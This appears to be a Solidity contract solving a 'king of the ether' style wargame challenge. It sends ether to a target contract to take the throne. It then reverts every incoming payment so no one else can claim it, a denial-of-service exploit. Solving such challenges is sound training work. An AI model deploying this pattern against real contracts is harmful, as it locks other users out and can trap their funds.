/**
 *Submitted for verification at Etherscan.io on 2022-04-16
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract KingSolve {

    bool private _solve = false;
    constructor() public payable {
    }

    function solve(address _target) public {
        payable(_target).transfer(1000000000000001);
        _solve = true;
    }

    receive() external payable {
        if (_solve) {
            revert();
        }
    }

    fallback() external payable {
        if (_solve) {
            revert();
        }
    }
}